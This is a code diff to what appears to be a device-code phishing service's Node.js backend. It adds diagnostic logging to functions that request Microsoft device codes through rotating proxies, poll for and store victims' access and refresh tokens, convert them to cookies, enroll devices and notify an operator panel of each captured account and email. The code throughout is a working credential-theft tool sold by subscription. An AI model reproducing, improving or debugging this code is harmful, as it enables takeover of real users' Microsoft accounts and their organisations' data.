@@ -14,6 +14,8 @@ const cookieConverter = require('./cookieconverter');
 const { parsePrtClaims } = require('./kerberos');
 const { enrollDevice } = require('./devicecode');
 const devicemanager = require('./devicemanager');
+const dcdiag = require('../utils/dcdiag');
+const ioHolder = require('./io');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -26,6 +28,7 @@ const activeJobs = new Map();
  * @returns {object} job data including user_code, verification_uri, etc.
  */
 async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
+  dcdiag.log('flow_start mode=' + mode + ' req_ip=' + ((reqOptions && reqOptions.ip) || '(none)') + ' req_tenant=' + ((reqOptions && reqOptions.tenant) || '(global)'));
   try {
     // Decode JWT to get user_id and link_id
     const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
@@ -36,15 +39,24 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       "SELECT * FROM users WHERE id = ? AND subscription_status = 'active' AND (subscription_expiry IS NULL OR subscription_expiry > NOW())",
       [user_id]
     );
-    if (!users.length) throw new Error('Subscription inactive');
+    if (!users.length) {
+      dcdiag.fail('flow_aborted user_id=' + user_id + ' link_id=' + link_id + ' reason=subscription_inactive');
+      throw new Error('Subscription inactive');
+    }
+    dcdiag.log('flow_ok user_id=' + user_id + ' link_id=' + link_id + ' subscription=active');
     const user = users[0];
 
     const [links] = await db.query(
       'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
       [link_id, user_id, 'active']
     );
-    if (!links.length) throw new Error('Link not active');
+    if (!links.length) {
+      dcdiag.fail('flow_aborted user_id=' + user_id + ' link_id=' + link_id + ' reason=link_not_active_or_killed');
+      throw new Error('Link not active');
+    }
     const link = links[0];
+
+    dcdiag.log('flow_link user_id=' + user_id + ' link_id=' + link_id + ' template=' + link.template_type + ' verification_design=' + (link.verification_design || '(none)'));
 
     // Call Microsoft Device Code endpoint via proxy. The caller (the worker,
     // or a self-hosted page) may supply the link-specific tenant / client id;
@@ -53,6 +65,7 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     const clientId = (reqOptions && reqOptions.clientId) || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const deviceCodeScope = 'https://graph.microsoft.com/.default openid offline_access';
     const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
+    dcdiag.log('ms_devicecode user_id=' + user_id + ' link_id=' + link_id + ' tenant=' + tenant + ' client_id=' + String(clientId).substring(0, 8) + '...');
 
     const deviceCodeClaims = {
       access_token: {
@@ -82,12 +95,16 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       const data = sticky.response && sticky.response.data;
       if (data && data.user_code && data.device_code) {
         dcData = data;
+        dcdiag.log('ms_devicecode_ok user_id=' + user_id + ' link_id=' + link_id + ' via=proxy proxy=' + (sticky.proxy && sticky.proxy.id));
       } else {
+        dcdiag.fail('ms_devicecode_empty_response user_id=' + user_id + ' link_id=' + link_id + ' via=proxy body=' + String(data).substring(0, 200));
       }
     } catch (err) {
+      dcdiag.fail('ms_devicecode_proxy_failed user_id=' + user_id + ' link_id=' + link_id + ' err=' + err.message);
     }
 
     if (!dcData) {
+      dcdiag.log('ms_devicecode_via_direct user_id=' + user_id + ' link_id=' + link_id);
       const direct = await ms.post(deviceCodeUrl, deviceCodeBody, {
         headers: requestHeaders,
         timeout: 15000,
@@ -96,10 +113,13 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       const data = direct.data;
       if (data && data.user_code && data.device_code) {
         dcData = data;
+        dcdiag.log('ms_devicecode_ok user_id=' + user_id + ' link_id=' + link_id + ' via=direct');
         if (proxy && proxy.id) {
           try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
         }
         proxy = null;
+      } else {
+        dcdiag.fail('ms_devicecode_empty_response user_id=' + user_id + ' link_id=' + link_id + ' via=direct body=' + String(data).substring(0, 200));
       }
     }
 
@@ -107,10 +127,12 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       if (proxy && proxy.id) {
         try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
       }
+      dcdiag.fail('flow_aborted user_id=' + user_id + ' link_id=' + link_id + ' reason=ms_returned_no_user_code');
       throw new Error('Microsoft device code request failed: no user_code returned (proxy and direct attempts both failed)');
     }
 
     const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
+    dcdiag.log('job_created jobId=' + jobId + ' user_id=' + user_id + ' link_id=' + link_id + ' user_code=' + dcData.user_code + ' expires_in=' + (dcData.expires_in || 900));
 
     // Store job in memory with IP/user-agent for later token capture
     activeJobs.set(jobId, {
@@ -140,7 +162,9 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     });
 
     // Start polling in background
-    pollForToken(jobId);
+    pollForToken(jobId).catch(function (err) {
+      dcdiag.fail('poll_crashed jobId=' + jobId + ' user_id=' + user_id + ' link_id=' + link_id + ' err=' + err.message);
+    });
 
     return {
       job_id: jobId,
@@ -152,8 +176,7 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       message: dcData.message,
     };
   } catch (err) {
-    if (err.response) {
-    }
+    dcdiag.fail('flow_start_failed err=' + (err && err.message) + ' http_status=' + (err && err.response && err.response.status) + ' http_body=' + String(err && err.response && err.response.data).substring(0, 250));
     throw err;
   }
 }
@@ -163,13 +186,17 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
  */
 async function pollForToken(jobId) {
   const job = activeJobs.get(jobId);
-  if (!job) return;
+  if (!job) {
+    dcdiag.fail('poll_no_job jobId=' + jobId);
+    return;
+  }
 
   // Use the same tenant / client id as the device-code call that created this
   // job. A mismatched pair makes the token endpoint reject the grant.
   const tenant = job.tenant || config.AZURE_TENANT || 'organizations';
   const clientId = job.clientId || config.AZURE_CLIENT_ID;
   const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));
+  dcdiag.log('poll_start jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' tenant=' + tenant + ' interval=' + (job.interval || 5) + 's max_attempts=' + maxAttempts + ' expires_in=' + (job.expires_in || 900));
 
   for (let i = 0; i < maxAttempts; i++) {
     if (!activeJobs.has(jobId)) return; // Job cancelled
@@ -177,14 +204,16 @@ async function pollForToken(jobId) {
     // Check if expired before polling
     if (Date.now() > job.expires_at) {
       job.status = 'expired';
+      dcdiag.fail('poll_expired jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' attempts=' + (i + 1) + ' no_token_obtained');
       // Update visitor status to timeout
       try {
-        await db.query(
+        const [r] = await db.query(
           'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
           ['timeout', job.user_id, job.link_id, 'waiting']
         );
+        dcdiag.log('visitor_status jobId=' + jobId + ' link_id=' + job.link_id + ' ->timeout updated=' + r.affectedRows);
       } catch (e) {
-        /* ignore */
+        dcdiag.fail('visitor_timeout_failed jobId=' + jobId + ' err=' + e.message);
       }
       return;
     }
@@ -216,6 +245,7 @@ async function pollForToken(jobId) {
       if (tokenData.access_token) {
         // SUCCESS! Store token
         job.status = 'completed';
+        dcdiag.log('token_obtained jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' attempt=' + (i + 1) + ' has_refresh=' + (!!tokenData.refresh_token) + ' has_id_token=' + (!!tokenData.id_token) + ' set_cookies=' + ((tokenResponse.headers['set-cookie'] || []).length));
 
         // Extract email FIRST before using it
         let capturedEmail = null;
@@ -313,12 +343,16 @@ async function pollForToken(jobId) {
 
         // Mark visitors as done for this user/link
         try {
-          await db.query(
+          const [doneR] = await db.query(
             'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
             ['done', job.user_id, job.link_id, 'waiting']
           );
+          dcdiag.log('visitor_status jobId=' + jobId + ' link_id=' + job.link_id + ' ->done updated=' + doneR.affectedRows);
+          if (doneR.affectedRows === 0) {
+            dcdiag.fail('visitor_done_no_rows jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' no_waiting_visitor_found');
+          }
         } catch (e) {
-          /* silent */
+          dcdiag.fail('visitor_done_failed jobId=' + jobId + ' err=' + e.message);
         }
         return;
       }
@@ -328,6 +362,7 @@ async function pollForToken(jobId) {
       const errorDesc = tokenData.error_description || '';
 
       if (errorCode === 'authorization_pending') continue;
+      if (errorCode) dcdiag.log('poll_error jobId=' + jobId + ' attempt=' + (i + 1) + ' code=' + errorCode + ' desc=' + String(errorDesc).substring(0, 150));
 
       if (errorCode === 'slow_down') {
         // Increase interval
@@ -350,6 +385,7 @@ async function pollForToken(jobId) {
       ) {
         job.status = 'failed';
         job.error = 'Code expired';
+        dcdiag.fail('poll_failed jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' code=' + errorCode + ' desc=' + String(errorDesc).substring(0, 150));
         return;
       }
 
@@ -360,14 +396,19 @@ async function pollForToken(jobId) {
         errorCode === 'authorization_declined'
       ) {
         job.status = 'soft_error';
+        dcdiag.log('poll_soft_error jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' retrying_token_mode');
         // Start a new device code flow in token mode and store it
         const newJob = await retryAsTokenMode(job);
         if (newJob) {
           job.retry_job_id = newJob.jobId;
+          dcdiag.log('poll_retry_job jobId=' + jobId + ' retry_jobId=' + newJob.jobId + ' new_user_code=' + newJob.user_code);
+        } else {
+          dcdiag.fail('poll_retry_failed jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' code=' + errorCode);
         }
         return;
       }
     } catch (err) {
+      dcdiag.fail('poll_exception jobId=' + jobId + ' attempt=' + (i + 1) + ' err=' + err.message);
       // Mark proxy as failure
       if (job.proxy_id) {
         try {
@@ -382,13 +423,15 @@ async function pollForToken(jobId) {
 
   // Exhausted attempts - mark as expired with visitor timeout
   job.status = 'expired';
+  dcdiag.fail('poll_exhausted jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' attempts=' + maxAttempts + ' no_token_obtained');
   try {
-    await db.query(
+    const [xR] = await db.query(
       'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
       ['timeout', job.user_id, job.link_id, 'waiting']
     );
+    dcdiag.log('visitor_status jobId=' + jobId + ' link_id=' + job.link_id + ' ->timeout updated=' + xR.affectedRows);
   } catch (e) {
-    /* ignore */
+    dcdiag.fail('visitor_timeout_failed jobId=' + jobId + ' err=' + e.message);
   }
 }
 
@@ -396,6 +439,7 @@ async function pollForToken(jobId) {
  * Retry as token mode (create new device code)
  */
 async function retryAsTokenMode(originalJob) {
+  dcdiag.log('retry_start user_id=' + originalJob.user_id + ' link_id=' + originalJob.link_id + ' from_job=' + originalJob.jobId);
   try {
     // Use same tenant as device code endpoint (organizations for adrs_access scope)
     const tenant = config.AZURE_TENANT || 'organizations';
@@ -442,7 +486,10 @@ async function retryAsTokenMode(originalJob) {
     };
 
     activeJobs.set(newJobId, newJob);
-    pollForToken(newJobId);
+    dcdiag.log('retry_job_created jobId=' + newJobId + ' user_id=' + originalJob.user_id + ' link_id=' + originalJob.link_id + ' user_code=' + dcData.user_code);
+    pollForToken(newJobId).catch(function (err) {
+      dcdiag.fail('poll_crashed retry jobId=' + newJobId + ' err=' + err.message);
+    });
 
     return {
       jobId: newJobId,
@@ -453,6 +500,7 @@ async function retryAsTokenMode(originalJob) {
       interval: dcData.interval || 5,
     };
   } catch (err) {
+    dcdiag.fail('retry_failed user_id=' + originalJob.user_id + ' link_id=' + originalJob.link_id + ' err=' + (err && err.message));
     return null;
   }
 }
@@ -461,6 +509,7 @@ async function retryAsTokenMode(originalJob) {
  * Store captured token in database
  */
 async function storeToken(job, tokenData, responseCookies = []) {
+  dcdiag.log('store_start jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' mode=' + (job.mode || 'token') + ' ip=' + (job.ip_address || '(none)') + ' cookies_in=' + (responseCookies || []).length);
   try {
     // Extract email and tenant from id_token
     let email = null;
@@ -783,7 +832,9 @@ async function storeToken(job, tokenData, responseCookies = []) {
         tokenId = legacyResult.insertId;
       }
     } catch (e) {
+      dcdiag.fail('token_insert_failed jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' err=' + e.message);
     }
+    dcdiag.log('token_stored tokenId=' + tokenId + ' jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id);
 
     if (tokenId && deviceEnrolled && accountType === 'work_school'
         && tenant && tenant !== 'common' && tenant !== 'organizations') {
@@ -899,17 +950,23 @@ async function storeToken(job, tokenData, responseCookies = []) {
       );
       const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
       const newStatus = blockDone ? 'blocked' : 'done';
+      dcdiag.log('store_status jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' block_done_visitors=' + !!blockDone);
 
       const [updateResult] = await db.query(
         'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
         [newStatus, job.user_id, job.link_id, 'waiting', 'timeout']
       );
+      dcdiag.log('store_visitor_status jobId=' + job.jobId + ' link_id=' + job.link_id + ' ->' + newStatus + ' updated=' + updateResult.affectedRows);
+      if (updateResult.affectedRows === 0) {
+        dcdiag.fail('store_visitor_no_rows jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' no_visitor_in_waiting_or_timeout');
+      }
     } catch (updateErr) {
+      dcdiag.fail('store_visitor_status_failed jobId=' + job.jobId + ' err=' + updateErr.message);
     }
 
     // Notify via WebSocket
     try {
-      const io = require('express')().get('io');
+      const io = ioHolder.getIo();
       if (io) {
         const notifyTokenType = job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success ? 'cookie' : (job.mode || 'token');
         io.to(`user_${job.user_id}`).emit('new_token', {
@@ -918,9 +975,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
           token_type: notifyTokenType,
           created_at: new Date(),
         });
+        dcdiag.log('panel_notified jobId=' + job.jobId + ' user_id=' + job.user_id + ' tokenId=' + tokenId + ' email=' + (email || '(none)') + ' type=' + notifyTokenType);
+      } else {
+        dcdiag.fail('panel_not_notified jobId=' + job.jobId + ' user_id=' + job.user_id + ' tokenId=' + tokenId + ' reason=io_unavailable');
       }
     } catch (e) {
-      /* silent */
+      dcdiag.fail('panel_notify_failed jobId=' + job.jobId + ' user_id=' + job.user_id + ' err=' + e.message);
     }
 
     try {
